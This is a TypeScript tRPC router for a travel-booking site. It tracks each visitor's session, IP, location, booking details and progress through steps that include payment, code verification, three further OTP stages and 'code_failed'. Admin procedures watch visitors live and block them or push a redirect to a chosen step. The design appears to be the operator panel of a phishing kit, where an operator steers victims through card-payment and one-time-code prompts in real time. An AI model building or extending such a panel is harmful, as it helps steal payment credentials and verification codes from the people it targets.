import { z } from 'zod';
import { router, publicProcedure, adminProcedure } from '../trpc.js';
import { db } from '../db.js';
import { emitVisitorUpdate } from '../socket.js';

const bookingDataSchema = z.object({
  from: z.string().max(120).optional(),
  to: z.string().max(120).optional(),
  date: z.string().max(40).optional(),
  passengers: z.number().int().nonnegative().max(100).optional(),
  selectedTrip: z.string().max(500).optional(),
  selectedSeats: z.array(z.string().max(30)).max(100).optional(),
  fareClass: z.string().max(80).optional(),
}).optional();

const visitorStepSchema = z.enum([
  'home', 'search', 'results', 'trip_details', 'seat_selection', 'passenger_info',
  'payment_method', 'payment', 'code_verification', 'otp_2', 'otp_3', 'otp_4',
  'success', 'code_failed', 'closed',
]);

const redirectUrlSchema = z.string().trim().min(1).max(2048).refine((value) => {
  if (value.startsWith('step:')) return visitorStepSchema.safeParse(value.slice(5)).success;
  if (value.startsWith('/') && !value.startsWith('//')) return true;
  try {
    const parsed = new URL(value);
    return parsed.protocol === 'https:' || parsed.protocol === 'http:';
  } catch {
    return false;
  }
}, { message: 'رابط التوجيه يجب أن يكون HTTP/HTTPS أو مساراً داخلياً آمناً' });

function parseObject(value: unknown): Record<string, unknown> {
  if (typeof value !== 'string' || !value) return {};
  try {
    const parsed = JSON.parse(value);
    return parsed && typeof parsed === 'object' && !Array.isArray(parsed) ? parsed : {};
  } catch {
    return {};
  }
}

function parseHistory(value: unknown): Array<{ step: string; time: number }> {
  if (typeof value !== 'string' || !value) return [];
  try {
    const parsed = JSON.parse(value);
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

export const visitorsRouter = router({
  track: publicProcedure
    .input(z.object({
      sessionId: z.string().trim().min(4).max(128),
      page: z.string().max(500).optional().default('/'),
      userAgent: z.string().max(1000).optional().default(''),
      ip: z.string().max(64).optional(),
      country: z.string().max(120).optional(),
      city: z.string().max(120).optional(),
      step: visitorStepSchema.optional(),
      bookingData: bookingDataSchema,
    }))
    .mutation(async ({ input, ctx }) => {
      const ip = ctx.clientIp;

      const existing = await db.visitor.findUnique({ where: { sessionId: input.sessionId } });

      if (existing?.isBlocked) {
        return { blocked: true, redirectUrl: existing.redirectUrl ?? null };
      }

      const stepHistory = parseHistory(existing?.stepHistory);
      const currentBookingData = parseObject(existing?.bookingData);
      const bookingData = input.bookingData
        ? { ...currentBookingData, ...input.bookingData }
        : currentBookingData;
      const pendingRedirect = existing?.redirectUrl ?? null;
      const now = new Date().toISOString();

      if (input.step) {
        stepHistory.push({ step: input.step, time: Date.now() });
        // Keep only last 50 steps
        if (stepHistory.length > 50) stepHistory.splice(0, stepHistory.length - 50);
      }

      await db.visitor.upsert({
        where: { sessionId: input.sessionId },
        update: {
          page: input.page,
          userAgent: input.userAgent,
          ip,
          ...(input.country && { country: input.country }),
          ...(input.city && { city: input.city }),
          ...(input.step && { currentStep: input.step, stepHistory: JSON.stringify(stepHistory) }),
          ...(input.bookingData && { bookingData: JSON.stringify(bookingData) }),
          ...(pendingRedirect && { redirectUrl: null }),
          lastActive: now,
        },
        create: {
          sessionId: input.sessionId,
          page: input.page ?? '/',
          userAgent: input.userAgent ?? '',
          ip,
          country: input.country ?? '',
          city: input.city ?? '',
          currentStep: input.step ?? 'home',
          stepHistory: JSON.stringify(input.step ? [{ step: input.step, time: Date.now() }] : []),
          isBlocked: false,
          bookingData: JSON.stringify(input.bookingData ?? {}),
          lastActive: now,
        },
      });

      // Notify admin dashboard in real-time
      emitVisitorUpdate({
        sessionId: input.sessionId,
        page: input.page,
        ip,
        currentStep: input.step ?? 'home',
        lastActive: new Date().toISOString(),
      });

      return { blocked: false, redirectUrl: pendingRedirect };
    }),

  stats: adminProcedure.query(async () => {
    const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000);
    const [total, active, blocked] = await Promise.all([
      db.visitor.count(),
      db.visitor.count({ where: { lastActive: { gte: fiveMinAgo }, isBlocked: false } }),
      db.visitor.count({ where: { isBlocked: true } }),
    ]);
    return { total, active, blocked };
  }),

  list: adminProcedure.query(async () => {
    const visitors = await db.visitor.findMany({
      orderBy: { lastActive: 'desc' },
      take: 200,
    });
    return visitors.map(v => ({
      ...v,
      stepHistory: parseHistory(v.stepHistory),
      bookingData: parseObject(v.bookingData),
    }));
  }),

  blockVisitor: adminProcedure
    .input(z.object({
      sessionId: z.string().trim().min(4).max(128),
      blocked: z.boolean(),
      redirectUrl: redirectUrlSchema.nullable().optional(),
    }))
    .mutation(async ({ input }) => {
      await db.visitor.update({
        where: { sessionId: input.sessionId },
        data: {
          isBlocked: input.blocked,
          ...(input.redirectUrl !== undefined ? { redirectUrl: input.redirectUrl } : {}),
        },
      });
      return { success: true };
    }),

  setRedirectUrl: adminProcedure
    .input(z.object({
      sessionId: z.string().trim().min(4).max(128),
      redirectUrl: redirectUrlSchema,
    }))
    .mutation(async ({ input }) => {
      await db.visitor.update({
        where: { sessionId: input.sessionId },
        data: { redirectUrl: input.redirectUrl },
      });
      return { success: true };
    }),
});
